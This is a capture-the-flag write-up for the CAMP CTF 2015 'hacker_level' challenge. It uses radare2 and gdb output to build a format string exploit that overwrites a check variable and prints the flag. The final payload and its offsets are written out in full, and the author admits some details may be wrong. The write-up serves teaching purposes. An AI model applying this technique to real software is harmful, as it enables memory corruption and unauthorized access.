# CAMP CTF 2015: hacker_level-200

**Category:** Pwn
**Points:** 200
**Solves:** 64
**Description:**

> What's your hacker level?
>
> Find out with this nifty little app at challs.campctf.ccc.ac:10118. You can also run your own instance: [hacker_level](hacker_level.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://ctf-team.vulnhub.com/campctf-2015-hacker-level/> 

### Meta

Vulnerability:

* Format String
* Hardcoded Check Evasion

We are given an unstripped 32bit ELF for i386 Linux:

```bash
$ file hacker_level
hacker_level: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=29288494155b99bcb97cd3af0961c9a34d307be2, not stripped
```

Running the binary:

```bash
$ ./hacker_level
What's your name? hello
Hello, hello
Sorry, you're not leet enough to get the flag :(
Your hacker level is: 0x3076
```

We can input a name, which is then printed back to us.

We open the binary in `radare2` to print available functions:

```bash
[0x080486ea]> aa
[0x080486ea]> afl | sort -k1 | column -t
0x08048440  35   3   sym._init
0x08048480  16   2   sym.imp.setbuf
0x08048490  16   2   sym.imp.printf
0x080484a0  16   2   sym.imp.fgets
0x080484b0  16   2   sym.imp.fclose
0x080484c0  16   2   sym.imp.__stack_chk_fail
0x080484d0  16   2   sym.imp.usleep
0x080484e0  16   2   sym.imp.fread
0x080484f0  16   2   sym.imp.puts
0x08048500  16   2   loc.imp.__gmon_start__
0x08048510  16   2   sym.imp.__libc_start_main
0x08048520  16   2   sym.imp.fopen
0x08048530  476  11  section..text
0x080486ea  34   1   entry0
0x08048710  4    1   sym.__x86.get_pc_thunk.bx
0x08048720  43   4   sym.deregister_tm_clones
0x08048750  53   4   sym.register_tm_clones
0x08048790  30   3   sym.__do_global_dtors_aux
0x080487b0  43   4   sym.frame_dummy
0x080487e0  93   4   sym.__libc_csu_init
0x08048840  2    1   sym.__libc_csu_fini
0x08048844  20   1   sym._fini
```

We see some interesting imported functions, such as `fgets`, `printf` and `fread`, as well as our binarys functions, all cluttered together in `section..text`.

Fortunately, we are given the source code of our binary, [hacker_level.c](./hacker_level.c).

We can see some interesting things:

* In line `21`, we can clearly see our input handed - without modifications - to `printf` as the first parameter. This indicates a Format String Vulnerability.
* In line `24`, we see a check of our `level` object against `0xCCC31337`:
  * If it fails, it just prints that we don't have the correct hacker level
  * If it succeeds, the flag is read from `flag.txt` (if it exists) and printed to us
* The function `calc_level` calculates our level in such a way that we never achieve the correct level in a legal way. Our level is always calculated modulo `0xcafe`.

Having these statements in mind, we know that we have to overwrite `level` to fit `0xCCC31337`.

We first have to find out the address to `level`, e.g. in `radare2`, to overwrite it using a Format String Exploit:

```bash
[0x080486ea]> is | grep level
vaddr=0x0804a04c paddr=0x0000104c ord=044 fwd=NONE sz=4 bind=LOCAL type=OBJECT name=level
```

Now that we have the address to `level` (`0x0804a04c`), we have to find the correct offset to our input.

First, decompile the text section of our binary in `radare2` to find the address to our `printf(name);` call:

```bash
[0x080486ea]> aa
[0x080486ea]> pdf @ section..text 
            ;-- main:
            ;-- main:
            ;-- section_end..plt:
/ (fcn) section..text 476
|           ; var int local_0_1    @ ebp-0x1
[...]
|           0x080485fd      c70424738804.  mov dword [esp], str.Hello_ ; hacker_level.c:20  printf("Hello, "); ; [0x8048873:4]=0x6c6c6548  LEA str.Hello_ ; "Hello, " @ 0x8048873 ; .//hacker_level.c:20  .usleep(150000);
|           0x08048604      e887feffff     call sym.imp.printf
|           0x08048609      891c24         mov dword [esp], ebx        ; hacker_level.c:21  printf(name); ; .//hacker_level.c:21  .printf(\"Hello, \");
|           0x0804860c      e87ffeffff     call sym.imp.printf
|           0x08048611      c7042460ae0a.  mov dword [esp], 0xaae60    ; hacker_level.c:23  usleep(700000); ; [0xaae60:4]=-1 ; .//hacker_level.c:23  
|           0x08048618      e8b3feffff     call sym.imp.usleep
[...]
```

Looks like we have to set a breakpoint in `gdb` at `0x0804860c` to avoid bruteforcing the correct offset for our Format String Exploit:

```bash
gdb-peda$ b *0x0804860c
Breakpoint 1 at 0x804860c: file hacker_level.c, line 21.
gdb-peda$ r
Starting program: /home/vbox/pwn/tasks/camp-hackercalc/hacker_level 
What's your name? AAAA%x.%x.%x
Hello, [----------------------------------registers-----------------------------------]
EAX: 0x7 
EBX: 0xffffd4bc ("AAAA%x.%x.%x\n")
ECX: 0x7 
EDX: 0xf7fb9898 --> 0x0 
ESI: 0xffffd4c9 --> 0x0 
EDI: 0xffffd4fc --> 0x0 
EBP: 0xffffd568 --> 0x0 
ESP: 0xffffd4a0 --> 0xffffd4bc ("AAAA%x.%x.%x\n")
EIP: 0x804860c (<main+220>:     call   0x8048490 <printf@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485fd <main+205>:        mov    DWORD PTR [esp],0x8048873
   0x8048604 <main+212>:        call   0x8048490 <printf@plt>
   0x8048609 <main+217>:        mov    DWORD PTR [esp],ebx
=> 0x804860c <main+220>:        call   0x8048490 <printf@plt>
   0x8048611 <main+225>:        mov    DWORD PTR [esp],0xaae60
   0x8048618 <main+232>:        call   0x80484d0 <usleep@plt>
   0x804861d <main+237>:        add    esp,0x10
   0x8048620 <main+240>:        cmp    DWORD PTR ds:0x804a04c,0xccc31337
Guessed arguments:
arg[0]: 0xffffd4bc ("AAAA%x.%x.%x\n")
[------------------------------------stack-------------------------------------]
0000| 0xffffd4a0 --> 0xffffd4bc ("AAAA%x.%x.%x\n")
0004| 0xffffd4a4 --> 0x40 ('@')
0008| 0xffffd4a8 --> 0xf7fb8c20 --> 0xfbad208b 
0012| 0xffffd4ac --> 0xf7ffdaf0 --> 0xf7ffda94 --> 0xf7fbc2b8 --> 0xf7ffd938 --> 0x0 
0016| 0xffffd4b0 --> 0xffffd570 --> 0x80487e0 (<__libc_csu_init>:       push   ebp)
0020| 0xffffd4b4 --> 0xf7fe57aa (cmp    eax,0x0)
0024| 0xffffd4b8 --> 0xffffd520 --> 0xffffffff 
0028| 0xffffd4bc ("AAAA%x.%x.%x\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804860c in main () at hacker_level.c:21
21              printf(name);
gdb-peda$ x/20wx $esp
0xffffd4a0:     0xffffd4bc      0x00000040      0xf7fb8c20      0xf7ffdaf0
0xffffd4b0:     0xffffd570      0xf7fe57aa      0xffffd520      0x41414141
0xffffd4c0:     0x252e7825      0x78252e78      0x0000000a      0x00000000
```

Our stack can be represented as such:

![](./stack.png)

On the left side, we can see what `printf` expects on the stack. On the right side, we see the values and addresses pushed to the stack.

Our input, `AAAA`, is assumed to be the format string and has the address `0xffffd4bc`.

It also is the `7th` word on the stack after the assumed format string - this is our offset.

To confirm:

```bash
$ ./hacker_level
What's your name? AAAA%x.%x.%x.%x.%x.%x.%x
Hello, AAAA40.f7745c20.f778aaf0.ffb684d0.f77727aa.ffb68480.41414141
Sorry, you're not leet enough to get the flag :(
Your hacker level is: 0x8957
```

The seventh `%x` in our test format string `AAAA%x.%x.%x.%x.%x.%x.%x` prints the beginning of our input, `41414141` - sweet!

If we switch `AAAA` with the address `level`, we can use `printf` to store a value into the given address using the format operand `%n`.

`%n` stores the number already printed into a given offset that we can specify by using the `<num>$` prefix. `%7$n` would mean store the number of characters printed into the seventh format string argument.

However, since we don't want to print `0xCCC31337`==`3435336503` characters to store the value, we have to split this operation into two smaller ones:

* Store the value `0x1337`==`4919` into the second half of `level`. Address: `0x0804a04c`
* Store the value `0xCCC3`==`52419` into the first half of `level`. Address: `0x0804a04e`
* Subtract previously printed characters from each value, making the value for the second half `4911` (8 bytes printed for both addresses) and the first half `47500` (`52149`-`4919`)

Our `printf` call will look like that: `printf("formatstring/input", &level_firsthalf, &level_secondhalf);`.

The final exploit is the following:

```bash
$ python -c 'print "\x4c\xa0\x04\x08\x4e\xa0\x04\x08%.4911u%7$hn%.47500u%8$hn"' > in
gdb-peda$ r < in
Starting program: /home/vbox/pwn/tasks/camp-hackercalc/hacker_level < in
What's your name? Hello, LN0000000000[...]
[...]
[...]00000004160457760
The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604
[Inferior 1 (process 2925) exited normally]
Warning: not running or target is remote
```

The flag is `CAMP15_337deec05ccc63b1168ba3379ae4d65854132604`.

Note that this writeup is not as perfect as others. Please read others and fix issues with this one (e.g. the order of halves and their addresses), if you can!

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/campctf-2015-hacker-level/> 
* <https://nuc13us.wordpress.com/2015/09/04/hacker_level-200-campctf-2015/>
* [Russian](http://reu.org.ua/camp-ctf-2015-hacker-level.html)
* [Japanese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001675.html)
* A similar challenge by [exploit-exercises](https://exploit-exercises.com/protostar/format3/) and a [writeup](https://www.mattandreko.com/2012/02/01/exploit-exercises-protostar-format-3/)
